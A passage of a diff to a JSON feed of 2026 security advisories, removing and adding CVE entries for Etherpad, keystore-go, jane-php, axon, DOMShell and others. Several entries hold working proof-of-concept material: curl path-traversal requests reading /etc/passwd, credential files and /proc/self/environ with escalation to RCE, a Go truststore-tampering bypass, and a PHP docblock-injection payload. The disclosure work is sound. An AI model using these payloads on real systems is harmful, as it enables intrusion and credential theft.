[]byte(\"wrong-password\"))\n        fmt.Printf(\"[*] Decode(legit, wrong-password) -> err=%v  (expected ErrInvalidDigest)\\n\", err)\n\n        // Attacker: tamper with the certificate, then strip the 20-byte digest.\n        tampered := bytes.Replace(append([]byte(nil), legit...), originalCert, evilCert, 1)\n        tampered = tampered[:len(tampered)-20] // remove trailing SHA-1 digest entirely\n\n        // 1) Tampered keystore + CORRECT password: integrity check should fail.\n        out, err := keystore.Decode(bytes.NewReader(tampered), []byte(\"correct-password\"))\n        if err == nil {\n                entry := out[\"trusted-ca\"].(*keystore.TrustedCertificateEntry)\n                fmt.Printf(\"\\n[BYPASS] Tampered keystore accepted with correct password.\\n\")\n                fmt.Printf(\"         Trusted cert content: %q\\n\", entry.Certificate.Content)\n        } else {\n                fmt.Printf(\"[ok] tampered keystore rejected: %v\\n\", err)\n                os.Exit(1)\n        }\n\n        // 2) Tampered keystore + WRONG password: should also fail.\n        out2, err2 := keystore.Decode(bytes.NewReader(tampered), []byte(\"attacker-does-not-know\"))\n        if err2 == nil {\n                entry := out2[\"trusted-ca\"].(*keystore.TrustedCertificateEntry)\n                fmt.Printf(\"[BYPASS] Tampered keystore accepted with WRONG password.\\n\")\n                fmt.Printf(\"         Trusted cert content: %q\\n\", entry.Certificate.Content)\n        } else {\n                fmt.Printf(\"[ok] wrong password rejected: %v\\n\", err2)\n                os.Exit(1)\n        }\n}\n```\n\nExpected output:\n\n```\n[*] Legitimate keystore: 97 bytes (last 20 = SHA-1 digest)\n[*] Decode(legit, wrong-password) -> err=keystore: invalid digest  (expected ErrInvalidDigest)\n\n[BYPASS] Tampered keystore accepted with correct password.\n         Trusted cert content: \"EVIL-ATTACKER-CA-CERTIFICATE!!!\"\n[BYPASS] Tampered keystore accepted with WRONG password.\n         Trusted cert content: \"EVIL-ATTACKER-CA-CERTIFICATE!!!\"\n```\n\n### Impact\nAny application that uses `keystore.Decode()` to load a JKS truststore and relies on the keystore password for tamper evidence is affected. An attacker who can write to the `.jks` file (local user, compromised deployment artefact, writable config volume, etc.) but does **not** know the keystore password can replace trusted CA certificates undetected. Downstream, this typically enables man-in-the-middle interception of TLS connections that trust the forged CA, compromising confidentiality and integrity of those connections. No authentication to the target application is required beyond file-write access; no user interaction is required.\n\nThis defect was fixed in commit `af93effd832cf1aef7794e69c31e1b668e17b851` (2019-09-16, \"Update to go1.13\"), which added an `if err != nil { return … }` guard after reading the trailing digest and replaced the length-of-actual loop with a full-length `bytes.Compare(actualDigest, computedDigest)`. That commit first shipped in tag **v3.0.0**. There is no fixed release on the bare `github.com/pavel-v-chernykh/keystore-go` module path — every release there (`v1.0.0` through `v2.1.0+incompatible`) predates the fix. The fixed code is available under the successor module paths:\n\n- `github.com/pavel-v-chernykh/keystore-go/v3` ≥ v3.0.0\n- `github.com/pavel-v-chernykh/keystore-go/v4` ≥ v4.0.0\n- `github.com/pavlo-v-chernykh/keystore-go/v4` ≥ v4.0.0 (repository renamed at v4.4.0; the Go module proxy serves all v4.x under both spellings)\n\nUsers of the legacy `v2` module path remain exposed and should migrate to `github.com/pavlo-v-chernykh/keystore-go/v4`.",
-      "cvssScore": 7.1,
-      "severity": "High",
-      "published": "2026-11-19",
-      "modified": "2026-11-19",
-      "cwe": {
-        "cwe_id": "CWE-252",
-        "name": "Unchecked Return Value"
-      },
-      "references": [
-        "https://github.com/pavlo-v-chernykh/keystore-go/security/advisories/GHSA-j282-pjg5-j643",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-76101",
-        "https://github.com/pavlo-v-chernykh/keystore-go/commit/af93effd832cf1aef7794e69c31e1b668e17b851",
-        "https://github.com/pavlo-v-chernykh/keystore-go/releases/tag/v3.0.0",
-        "https://github.com/advisories/GHSA-j282-pjg5-j643"
-      ],
-      "vulnerableProducts": [
-        "github.com/pavel-v-chernykh/keystore-go go",
-        "github.com/pavel-v-chernykh/keystore-go/v3 go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-76818",
-      "summary": "### Summary\naxon rtk-install downloads a pre-built rtkx binary from GitHub releases and executes it via subprocess.run() on every text-compression call, without verifying its integrity — no checksum, signature, or attestation check anywhere in the download/install path. If the release pipeline or a maintainer token for sammyjdev/rtkx were ever compromised, every axon user who installs or auto-bootstraps rtkx would silently download and execute an unverified binary with the same privileges as the axon process.\n\n### Details\nThe download path lives in src/axon/context/rtk_bootstrap.py:\n\n- _http_download() fetches the release archive over HTTPS via urllib.request.urlopen() and writes the raw response bytes to disk — no hash comparison against any published value.\n- _extract_binary() unpacks the archive (zip/tar.gz) and sets the executable bit (out.chmod(... S_IXUSR | S_IXGRP | S_IXOTH)), again with no verification step.\n- There is no reference to checksum, sha256, verify, signature, gpg, cosign, or sigstore anywhere in this file.\n\nThe binary is not dead code — it's on the active execution path. src/axon/context/rtk.py::rtk_binary_path() resolves to the bootstrapped binary at ~/.axon/bin/rtkx, and compress_text_with_rtk() invokes it directly:\n\n`\nresult = subprocess.run(\n    [path, \"read\", str(tmp_path)],\n    capture_output=True, text=True, timeout=timeout_seconds,\n)`\n\n### PoC\nThis is a missing-control finding rather than an active exploit, so reproduction is by code audit rather than a live payload:\n\nClone sammyjdev/axon and open src/axon/context/rtk_bootstrap.py.\nConfirm _http_download() and _extract_binary() perform no hash/signature check before chmod +x.\nTrace the call chain: bootstrap_rtkx() → _http_download() → _extract_binary() → rtk_binary_path() (in rtk.py) → subprocess.run() in compress_text_with_rtk().\nOptionally demonstrate impact safely: point download_url() / the download callable (already injectable per the module's own docstring, \"the download step is injectable so the extraction logic is testable offline\") at a local HTTP server serving an attacker-controlled archive, and confirm it gets extracted, chmod +x'd, and executed with no rejection.\n\n### Impact\nType: CWE-494 (Download of Code Without Integrity Check), \nleading to potential arbitrary code execution.\nWho's affected: Any axon user who runs axon rtk-install or triggers auto-bootstrap, if sammyjdev/rtkx's release pipeline or a maintainer's release credentials are ever compromised. Not exploitable today without that precondition, but the missing control removes the last line of defense against a supply-chain compromise of the binary dependency.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2026-11-19",
-      "modified": "2026-11-19",
-      "cwe": {
-        "cwe_id": "CWE-494",
-        "name": "Download of Code Without Integrity Check"
-      },
-      "references": [
-        "https://github.com/sammyjdev/axon/security/advisories/GHSA-r7wg-f7r2-8wf7",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-76818",
-        "https://github.com/sammyjdev/rtkx/pull/2",
-        "https://github.com/sammyjdev/rtkx/pull/3",
-        "https://github.com/sammyjdev/axon/commit/398e47d5d2b1e1ba88c8d2bac90ac30811a9152b"
-      ],
-      "vulnerableProducts": [
-        "axon-mcp pip"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-63412",
-      "summary": "### Summary\njane-php (open-api-3) builds PHP via nikic/php-parser (AST), so string literals are escaped -- but PHPDoc comment text is emitted RAW. The generated Client/Endpoint method docblocks embed the query parameter name verbatim in a `@param array{ \"<name>\"?: ... }` block. A `*/` in the query name closes the `/** ... */` docblock early and lands in class-body position; because the name is a raw string key (not identifier-mangled), the `*/` and following PHP survive. Injecting `*/ public function __construct(){ <code> } /*` adds an attacker-controlled __construct to the generated Client class, which runs when the client is instantiated -> RCE (CWE-94). Verified 7.11.2/PHP8.1.\n\n### Impact\nGenerating a client from an attacker-influenced OpenAPI document and using the generated SDK (instantiating the client, which apps do on every call) runs attacker PHP. CWE-94/95/116.\n\n### PoC\n`reproduce.sh` (+ `make_spec.py`, `gen.php`): scaffolds a composer project with jane-php/open-api-3, generates, instantiates the generated Client, shows the marker.\n\n### Suggested fix\nNeutralize `*/` (e.g. `*/`->`* /`) in all generated PHPDoc text (parameter names, descriptions). Regression-test with a parameter name/description containing `*/`.\n\n[maintainer-report.txt](https://github.com/user-attachments/files/29497099/maintainer-report.txt)\n[reproduce.sh](https://github.com/user-attachments/files/29497102/reproduce.sh)\n[gen.php](https://github.com/user-attachments/files/29497103/gen.php)\n[make_spec.py](https://github.com/user-attachments/files/29497104/make_spec.py)",
-      "cvssScore": 9.3,
+      "id": "CVE-2026-114516",
+      "summary": "### Summary\n\nAn unauthenticated path‑traversal / arbitrary file read vulnerability in Etherpad's /static/* handler allows any remote, unauthenticated user to read any file on the server's filesystem (e.g. GET /static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc/passwd returns /etc/passwd) available to the user running the etherpad software. Because the endpoint is mounted before the authentication middleware, no credentials, session, or configuration change are required. The read primitive could escalate to a full server compromise: on a typical deployment by disclosing settings.json / credentials.json / /proc/self/environ, which contain the admin password, giving an attacker an admin session and, through the admin plugin installer, remote code execution.\n\n### Details\n\nEtherpad serves plugin static assets through src/node/utils/Minify.ts. The request path is first passed through the canonical sanitizer src/node/utils/sanitizePathname.ts, which is careful to convert backslashes to forward slashes only on Windows:\n\n```\n// src/node/utils/sanitizePathname.ts:11-20\np = pathApi.normalize(p);\nif (pathApi.isAbsolute(p)) throw new Error(`absolute paths are forbidden: ${p}`);\nif (p.split(pathApi.sep)[0] === '..') throw new Error(`directory traversal: ${p}`);\n// THIS CONVERSION MUST ONLY BE DONE ON WINDOWS, otherwise on POSIXish systems '..\\\\' in the input\n// pathname would not be normalized away before being converted to '../'.\nif (pathApi.sep === '\\\\') p = p.replace(/\\\\/g, '/');\n```\n\nOn Linux a backslash is an ordinary filename byte, so an input segment like ..\\..\\..\\test contains no ./.. path components and passes every check in sanitizePathname unchanged. The project's own test suite confirms this: src/tests/backend-new/specs/sanitizePathname.ts:62 lists ['posix', '..\\\\foo'] among the accepted paths (returned unchanged).\n\nThe vulnerability is that Minify.ts then performs that Windows‑only conversion unconditionally, after the sanitizer has run, justified by a comment asserting the opposite of the invariant above:\n\n```\n// src/node/utils/Minify.ts:171-186\nconst match = filename.match(/^plugins\\/([^/]+)(\\/(?:(static\\/.*)|.*))?$/);\nif (match) {\nconst library = match[1];\nconst libraryPath = match[2] || '';\nif (plugins.plugins[library] && match[3]) {\nconst plugin = plugins.plugins[library];\nconst pluginPath = plugin.package.realPath;      // for 'ep_etherpad-lite' == <root>/src\nfilename = path.join(pluginPath, libraryPath);   // -> absolute path, backslashes preserved\n// ... \"This conversion does not introduce a directory\n// traversal vulnerability because all '..\\\\' substrings have already been removed by\n// sanitizePathname.\"                              // <-- FALSE on POSIX\nfilename = filename.replace(/\\\\/g, '/');          // <-- reintroduces ../ AFTER the check\n}\n```\n\nAfter line 186 the string becomes a real traversal (<root>/src/static/../../../../etc/passwd) with no re‑normalization and no containment check\nbefore the filesystem calls at Minify.ts:248 (fs.stat) and Minify.ts:315 (fs.readFile). Because path.join at line 179 produced an absolute\npath, path.resolve(ROOT_DIR, filename) discards ROOT_DIR entirely, and POSIX path.resolve collapses surplus .. at /, so the payload is root‑depth‑agnostic.\n\nThe route is reachable pre‑authentication. It is registered on the expressPreSession hook:\n\n```\n// src/ep.json\n{ \"name\": \"static\", \"hooks\": { \"expressPreSession\": \"ep_etherpad-lite/node/hooks/express/static\" } }\n// src/node/hooks/express/static.ts:38\napp.all('/static/*filename', minify);\n```\n\nand expressPreSession runs before the auth middleware:\n\n```\n// src/node/hooks/express.ts:244-247\nawait hooks.aCallAll('expressPreSession', {app, settings});   // static route registered here\napp.use(exports.sessionMiddleware);\napp.use(webaccess.checkAccess);                                // auth runs AFTER\n```\n\nThe plugin branch is always taken because src/static/js/pluginfw/plugins.ts:153-158 unconditionally registers the core pseudo‑plugin ep_etherpad-lite with package.realPath = <root>/src.\n\nTwo decode facts make the exploit functional: Express 5 / path‑to‑regexp v8 decode wildcard params per segment, once ((v) =>  v.split('/').map(decodeURIComponent)), so req.params.filename.join('/') (Minify.ts:147) yields the once‑decoded path fed to the sanitizer, and %5C (encoded backslash) is the only working separator (%2F decodes to /, is re‑split, and is rejected by the split('/')[0] === '..' guard).\n\n### PoC\n\nApplies to a default production deployment (no special configuration; works on Linux, e.g. the Docker image or a systemd source install). Replace TARGET:9001 with the instance.\n\n1. Read /etc/passwd (or any file) with no authentication. --path-as-is prevents the client from folding the traversal:\n\n```\ncurl --path-as-is \\\n'http://TARGET:9001/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc/passwd'\n```\n\nOther high‑value reads (over‑shoot the .. depth; it is absorbed at /):\n\nadmin password + secrets, root-agnostic via /proc/self/cwd\n```\ncurl --path-as-is 'http://TARGET:9001/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cproc/self/cwd/settings.json'\ncurl --path-as-is\n'http://TARGET:9001/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cproc/self/cwd/credentials.json'\n```\non docker-compose deployments the admin password is an env var:\n`curl --path-as-is 'http://TARGET:9001/static/plugins/ep_etherpad-lite/static/..%5C..%5C..%5C..%5C..%5C..%5C..%5Cproc/self/environ'`\n\nEach response returns the raw file bytes (with a harmless Content-Type: false header for extension‑less targets, Node coerces the value and does not throw).\n\n2. Escalate to RCE. Recover the admin credential from the files read in step 1, then:\n\nmint an admin session\n```\ncurl -i -X POST 'http://TARGET:9001/admin-auth/' \\\n-H \"Authorization: Basic $(printf 'admin:PASSWORD' | base64)\"\n# -> 200 + Set-Cookie: <prefix>express_sid=...\n```\n\nUsing that express_sid cookie, connect to the /pluginfw/installer Socket.IO namespace (gated only on session.user.is_admin, src/node/hooks/express/adminplugins.ts:22) and emit install for an attacker‑controlled ep_* plugin. Etherpad require()s the plugin's code in‑process during plugins.update() (src/static/js/pluginfw/shared.ts:30), executing arbitrary code as the Etherpad user.\n\n### Impact\n\n- Type: Improper limitation of a pathname �� unauthenticated arbitrary file read, with potential to remote code execution.\n- Access required: None. The vulnerable route is served before the authentication/authorization middleware, so it is exploitable by any client that can reach the HTTP port, regardless of requireAuthentication, requireAuthorization, or users configuration.\n- What an attacker can access: any file readable by the Etherpad process user, including settings.json/credentials.json (admin password, sessionKey, database credentials, SSO client secrets), /proc/self/environ (env‑supplied secrets such as ADMIN_PASSWORD, DB_PASS), the pad database, TLS private keys, and OS files such as /etc/passwd.\n- Escalation: the disclosed admin password yields an admin session; the admin plugin installer then provides in‑process code execution, i.e. full server takeover. Even without the plugin step, admin access permits rewriting the entire configuration (saveSettings + restartServer) and exfiltrating all stored data.\n- Who is impacted: every operator running an affected version, most severely those exposing Etherpad directly to untrusted networks. A reverse proxy does not mitigate it, the traversal uses %5C, which proxies forward unchanged.",
+      "cvssScore": 9.8,
       "severity": "Critical",
-      "published": "2026-11-19",
-      "modified": "2026-11-19",
+      "published": "2026-11-20",
+      "modified": "2026-11-20",
       "cwe": {
-        "cwe_id": "CWE-94",
-        "name": "Improper Control of Generation of Code"
+        "cwe_id": "CWE-22",
+        "name": "Improper Limitation of a Pathname to a Restricted Directory"
       },
       "references": [
-        "https://github.com/janephp/janephp/security/advisories/GHSA-q8v2-3j4h-xg2p",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-63412",
-        "https://github.com/janephp/janephp/pull/960",
-        "https://github.com/janephp/janephp/commit/0ea379deab5689475d62653b408de62ad3611c7a",
-        "https://github.com/janephp/janephp/releases/tag/v7.12.0"
+        "https://github.com/ether/etherpad/security/advisories/GHSA-mc8w-wjhw-45x5",
+        "https://github.com/ether/etherpad/pull/8081",
+        "https://github.com/ether/etherpad/commit/9c8d16d50e2fdfd9693ab35c43280410cb4db2fc",
+        "https://github.com/advisories/GHSA-mc8w-wjhw-45x5"
       ],
       "vulnerableProducts": [
-        "jane-php/open-api-3 composer"
+        "ep_etherpad-lite npm"
       ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-63413",
-      "summary": "### Summary\njane-php (open-api-3) builds PHP via nikic/php-parser (AST), so string literals are escaped -- but PHPDoc comment text is emitted RAW. The generated Client/Endpoint method docblocks embed the header parameter name verbatim in a `@param array{ \"<name>\"?: ... }` block. A `*/` in the header name closes the `/** ... */` docblock early and lands in class-body position; because the name is a raw string key (not identifier-mangled), the `*/` and following PHP survive. Injecting `*/ public function __construct(){ <code> } /*` adds an attacker-controlled __construct to the generated Client class, which runs when the client is instantiated -> RCE (CWE-94). Verified 7.11.2/PHP8.1.\n\n### Impact\nGenerating a client from an attacker-influenced OpenAPI document and using the generated SDK (instantiating the client, which apps do on every call) runs attacker PHP. CWE-94/95/116.\n\n### PoC\n`reproduce.sh` (+ `make_spec.py`, `gen.php`): scaffolds a composer project with jane-php/open-api-3, generates, instantiates the generated Client, shows the marker.\n\n### Suggested fix\nNeutralize `*/` (e.g. `*/`->`* /`) in all generated PHPDoc text (parameter names, descriptions). Regression-test with a parameter name/description containing `*/`.\n\n[maintainer-report.txt](https://github.com/user-attachments/files/29497253/maintainer-report.txt)\n[reproduce.sh](https://github.com/user-attachments/files/29497254/reproduce.sh)\n[gen.php](https://github.com/user-attachments/files/29497255/gen.php)\n[make_spec.py](https://github.com/user-attachments/files/29497256/make_spec.py)",
-      "cvssScore": 9.3,
-      "severity": "Critical",
-      "published": "2026-11-19",
-      "modified": "2026-11-19",
-      "cwe": {
-        "cwe_id": "CWE-94",
-        "name": "Improper Control of Generation of Code"
-      },
-      "references": [
-        "https://github.com/janephp/janephp/security/advisories/GHSA-x9xr-53qx-9qcf",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-63413",
-        "https://github.com/janephp/janephp/pull/960",
-        "https://github.com/janephp/janephp/commit/0ea379deab5689475d62653b408de62ad3611c7a",
-        "https://github.com/janephp/janephp/releases/tag/v7.12.0"
-      ],
-      "vulnerableProducts": [
-        "jane-php/open-api-3 composer"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-63411",
-      "summary": "### Summary\njane-php (open-api-3) builds PHP via nikic/php-parser (AST), so string literals are escaped -- but PHPDoc comment text is emitted RAW. The generated Client/Endpoint method docblocks embed the parameter description verbatim in a `@param array{ \"<name>\"?: ... }` block. A `*/` in the parameter description closes the `/** ... */` docblock early and lands in class-body position; because the name is a raw string key (not identifier-mangled), the `*/` and following PHP survive. Injecting `*/ public function __construct(){ <code> } /*` adds an attacker-controlled __construct to the generated Client class, which runs when the client is instantiated -> RCE (CWE-94). Verified 7.11.2/PHP8.1.\n\n### Impact\nGenerating a client from an attacker-influenced OpenAPI document and using the generated SDK (instantiating the client, which apps do on every call) runs attacker PHP. CWE-94/95/116.\n\n### PoC\n`reproduce.sh` (+ `make_spec.py`, `gen.php`): scaffolds a composer project with jane-php/open-api-3, generates, instantiates the generated Client, shows the marker.\n\n### Suggested fix\nNeutralize `*/` (e.g. `*/`->`* /`) in all generated PHPDoc text (parameter names, descriptions). Regression-test with a parameter name/description containing `*/`.\n[maintainer-report.txt](https://github.com/user-attachments/files/29497314/maintainer-report.txt)\n[reproduce.sh](https://github.com/user-attachments/files/29497317/reproduce.sh)\n[gen.php](https://github.com/user-attachments/files/29497319/gen.php)\n[make_spec.py](https://github.com/user-attachments/files/29497322/make_spec.py)",
-      "cvssScore": 9.3,
-      "severity": "Critical",
-      "published": "2026-11-19",
-      "modified": "2026-11-19",
-      "cwe": {
-        "cwe_id": "CWE-94",
-        "name": "Improper Control of Generation of Code"
-      },
-      "references": [
-        "https://github.com/janephp/janephp/security/advisories/GHSA-xwcw-j52r-34x4",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-63411",
-        "https://github.com/janephp/janephp/pull/960",
-        "https://github.com/janephp/janephp/commit/0ea379deab5689475d62653b408de62ad3611c7a",
-        "https://github.com/janephp/janephp/releases/tag/v7.12.0"
-      ],
-      "vulnerableProducts": [
-        "jane-php/open-api-3 composer"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-75518",
-      "summary": "### Summary\n\nThe `domshell_eval` MCP tool (and the `eval` command inside `domshell_execute`) was classified as **read-tier**, allowing it to run without the `--allow-write` server flag. However, `eval` and the write-tier `js` command dispatch to the same handler in the extension and call CDP `Runtime.evaluate` with the raw expression string and no side-effect gate. Any JavaScript expression could therefore mutate DOM, window, or global state through `domshell_eval` without the operator's `--allow-write` authorization.\n\nThe tool description explicitly promised \"(read-only) ... always available in read-only mode\" — the misclassification contradicted the documented contract, not just an implicit one.\n\n### Impact\n\nNo new capability was exposed — the same write access was already available via `domshell_js` with `--allow-write` — but the tier misclassification meant:\n\n- MCP hosts (Claude Desktop, Cursor, etc.) rendered the wrong approval UI (`readOnlyHint: true`)\n- Server-side tier flags (`--allow-write`) misrepresented what an AI agent was actually authorized to do\n- Audit logs and deny messages labeled write-tier activity as read-tier\n- Downstream tools and analysis relying on the tier separation could over-trust an `eval` call\n\nFraming: OWASP LLM Top 10 LLM06 (Excessive Agency), NIST AI RMF (tool permission boundary + human-approval fidelity), CWE-863 (Incorrect Authorization).\n\nThe reporter's main framing: **the MCP approval UI and server-side permission model can misrepresent the actual agency being granted to an AI agent.**\n\n### Affected code paths\n\n- `mcp-server/index.ts:113` — `WRITE_COMMANDS` excluded `eval`\n- `mcp-server/index.ts:879-887` — `domshell_eval` registered with `ANNO_READ` and description asserting read-only\n- `src/background/index.ts:1849-1854` — `js` and `eval` both dispatch to `handleJs(rawCode)`\n- `src/background/index.ts:3282` — `handleJs` calls `cdp.evaluateJs(code)`\n- `src/background/cdp_client.ts:660-667` — `evaluateJs` sends `Runtime.evaluate` with `expression: code, returnByValue: true, awaitPromise: true` and no `throwOnSideEffect` gate\n\n### Fix\n\nShipped in `@apireno/domshell@2.0.8` (2026-07-08):\n\n- `eval` added to `WRITE_COMMANDS`, aligning tier with actual capability\n- `domshell_eval` MCP annotation changed from `ANNO_READ` to `ANNO_WRITE`\n- Tool description and `MCP_INSTRUCTIONS` updated to remove read-only language; read-only DOM inspection needs pointed at `domshell_cat` / `domshell_text` / `domshell_find`\n- Server-only patch — no Chrome Web Store submission required; extension code unchanged\n- `SECURITY.md` added + GitHub Private Vulnerability Reporting enabled on the repo\n\n### Upgrade path\n\n```\nnpm install @apireno/domshell@2.0.8\n```\n\nOr, in a persistent install, restart your MCP server against the new version.\n\nDrives that call `eval` without `--allow-write` will start receiving `Error: 'eval' requires --allow-write`. Options:\n\n- Add `--allow-write` to the server flags if `eval`'s write capability is actually needed\n- Migrate read-only inspection to `domshell_cat` / `domshell_text` / `domshell_find`\n- Migrate to `domshell_js` if the caller already runs with `--allow-write` (same tier, same capability)\n\n### Integrator impact\n\n- **HKUDS/CLI-Anything** — unaffected; their harness doesn't invoke `eval` or `js` commands (verified by grep).\n- **Kgspin QA-UX drives** — unaffected; they run with `--allow-write` for their action gates.\n- **Direct Claude Desktop / Cursor sessions** — any that called `domshell_eval` without `--allow-write` will now be denied, aligning behavior with the documented contract.\n\n### Reporter / Credit\n\n**Ugur Ozer, AI Risk Management**\n<https://airiskmanagement.ca>\n<info@airiskmanagement.ca>\n\nSource-review-first responsible disclosure via private email to the maintainer on 2026-07-08. Reporter finding id: `DOMSHELL-EVAL-READ-TIER-BYPASS-001`. Ugur followed the standard disclosure ladder correctly despite the missing SECURITY.md at time of report — that gap has now been closed (repo now has SECURITY.md + GitHub Private Vulnerability Reporting enabled).\n\n### Timeline\n\n- 2026-07-08 — Report received by maintainer via private email\n- 2026-07-08 — Source-side claims verified against `main` at `2d63dab`; fix planned\n- 2026-07-08 — `@apireno/domshell@2.0.8` released to npm and the MCP registry; `SECURITY.md` added; GitHub PVR enabled\n- 2026-07-08 — This advisory published",
-      "cvssScore": 4.8,
+      "id": "CVE-2026-103033",
+      "summary": "### Summary\n\n`parseServerSignature` in the v1 module only initializes `ServerSignatureVerificationData.Extra` inside the `if err == nil` branch after `url.ParseQuery(parsedPayload.VerificationData)`. Go's `url.ParseQuery` returns the successfully-parsed pairs together with a non-nil error when the query string contains a malformed percent-escape. A subsequent loop unconditionally writes unknown keys into `Extra`, regardless of `err`, causing a nil-map write panic (assignment to entry in nil map) whenever an attacker supplies a `VerificationData` string with a bad %-escape (e.g. `x=1&%zz=2`).\n\nThis is reachable pre-authentication: `parseServerSignature` is called by the exported `VerifyServerSignature` / `VerifyServerSignatureSafe` before any HMAC/signature check, and `VerificationData` is attacker-controlled data forwarded by the client as part of the ALTCHA server-signature payload.\n\n### Impact\n\nAny application calling `VerifyServerSignature` or `VerifyServerSignatureSafe` on unauthenticated input can be made to panic by submitting a crafted payload. Under standard net/http, the per-request goroutine panic is recovered and the request aborts (a log-flood / per-request DoS); it escalates to a full process crash if verification runs in an application-spawned goroutine or a non-recovering framework.\n\n### Proof Of Concept\n\n```go\npayload, _ := json.Marshal(ServerSignaturePayload{\n    Algorithm:        SHA256,\n    VerificationData: \"x=1&%zz=2\",\n    Signature:        \"irrelevant\",\n    Verified:         true,\n})\nencoded := base64.StdEncoding.EncodeToString(payload)\nVerifyServerSignature(encoded, \"some-secret\") // panics: assignment to entry in nil map\n\n```\n\n### Patch\n\n`Extra` is now initialized unconditionally before the `url.ParseQuery` error check, so it's always safe to write into regardless of parse errors.\n\n### Workarounds\n\nRecover from panics around calls to `VerifyServerSignature`/`VerifyServerSignatureSafe`, or reject/sanitize `VerificationData` before calling them, until upgrading.\n\n### Patch\n\nPatch commit: 2c4fc27\n\n### Credit\n\nReported by Arpit Jain (@arpitjain099) via private disclosure.",
+      "cvssScore": 5.3,
       "severity": "Medium",
-      "published": "2026-11-19",
-      "modified": "2026-11-19",
+      "published": "2026-11-20",
+      "modified": "2026-11-20",
       "cwe": {
-        "cwe_id": "CWE-266",
-        "name": "Incorrect Privilege Assignment"
+        "cwe_id": "CWE-248",
+        "name": "Uncaught Exception"
       },
       "references": [
-        "https://github.com/apireno/DOMShell/security/advisories/GHSA-vg83-hcp4-5qcc",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-75518",
-        "https://github.com/apireno/DOMShell/commit/03c1d7625e220297aff0dde37613d65cfe6f9a36",
-        "https://github.com/apireno/DOMShell/releases/tag/mcp-v2.0.8",
-        "https://github.com/advisories/GHSA-vg83-hcp4-5qcc"
+        "https://github.com/altcha-org/altcha-lib-go/security/advisories/GHSA-gfwj-45pc-w6r5",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-103033",
+        "https://github.com/altcha-org/altcha-lib-go/commit/2c4fc27a7b2d5b89f7175676445efcacc564c27c",
+        "https://github.com/altcha-org/altcha-lib-go/releases/tag/v2.1.0",
+        "https://github.com/advisories/GHSA-gfwj-45pc-w6r5"
       ],
       "vulnerableProducts": [
-        "@apireno/domshell npm"
+        "github.com/altcha-org/altcha-lib-go/v2 go"
       ],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-69139",
-      "summary": "## Summary\n\nThe Django admin views for moderation comments (`CollectionCommentAdmin` and `RequestCommentAdmin`) render the full comment body but scope access only by an attacker-controlled `id` in the URL and Django's model-level `view_*comment` permission. They perform no per-object participant check. As a result, any authenticated staff user who holds the comment *view* permission can read the comments of **any** collection or moderation request — including ones they are not a participant of — simply by supplying the target object's id.\n\nComments are documented and intended to be private to the participants of a collection (its author and the moderators assigned to its workflow). This advisory concerns a read/write authorization asymmetry: the write paths already enforced `request.user == obj.author`, but the read paths did not enforce any participant check.\n\n## Details\n\n`ModerationRequest.user_can_view_comments()` — the gate intended to protect comment reads (author **or** assigned moderator) — existed in the codebase but was never called by the comment admins. Neither `CollectionCommentAdmin` nor `RequestCommentAdmin` overrode `get_queryset`, and their `changelist_view` / `changeform_view` methods resolved the target object directly from the user-supplied id without an authorization check.\n\nThe changelists are hard-scoped to a single collection / moderation request (they `raise Http404` when no id is present), so the exposure is not \"all comments at once,\" but any specific collection's or request's comments can be retrieved by iterating ids.\n\n- `list_display` on both admins includes the comment `message`, so the full   body is disclosed directly in the changelist HTML.\n- The individual changeform (`.../<id>/change/`) discloses the same content   via a direct URL.\n\n## Impact\n\n- **Type:** Information disclosure / broken object-level authorization (IDOR).\n- **Confidentiality:** Comment contents of collections/requests the user does   not participate in are exposed. This can include sensitive internal editorial   discussion.\n- **Integrity / Availability:** No impact — comment creation, editing, and   deletion already enforced author checks and are unaffected.\n- **Who is affected:** Deployments where more than one team/group of staff   reviewers holds the `view_collectioncomment` / `view_requestcomment`   permission. A reviewer of collection A can read the comments of collection B.\n\n## Workarounds\n\nRestrict the `view_collectioncomment` and `view_requestcomment` model permissions to trusted users only, and avoid granting them across teams that must not see each other's moderation comments. This does not fully close the issue but reduces the set of users who can exploit it. Upgrading is the only complete fix.\n\n## Remediation\n\nUpgrade to djangocms-moderation 2.4.1.\n\nThe fix adds a `user_can_view_comments` participant gate (author or assigned moderator) to both comment admins, enforced in `changelist_view` and `changeform_view` for both the collection and request comment models. A `ModerationCollection.user_can_view_comments()` method was added to mirror the existing `ModerationRequest.user_can_view_comments()`. Non-participants now receive an HTTP 403 (`PermissionDenied`).\n\n## Credit\n\nReported via coordinated disclosure.",
-      "cvssScore": 4.3,
-      "severity": "Medium",
-      "published": "2026-11-19",
-      "modified": "2026-11-19",
-      "cwe": {
-        "cwe_id": "CWE-200",
-        "name": "Exposure of Sensitive Information to an Unauthorized Actor"
-      },
-      "references": [
-        "https://github.com/django-cms/djangocms-moderation/security/advisories/GHSA-pj7p-238h-76pv",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-69139",
-        "https://github.com/django-cms/djangocms-moderation/pull/374",
-        "https://github.com/django-cms/djangocms-moderation/commit/a044d9c98c127454b73e8a8ada6e59aaa0a8f621",
-        "https://github.com/django-cms/djangocms-moderation/releases/tag/2.4.0"
-      ],
-      "vulnerableProducts": [
-        "djangocms-moderation pip"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-71535",
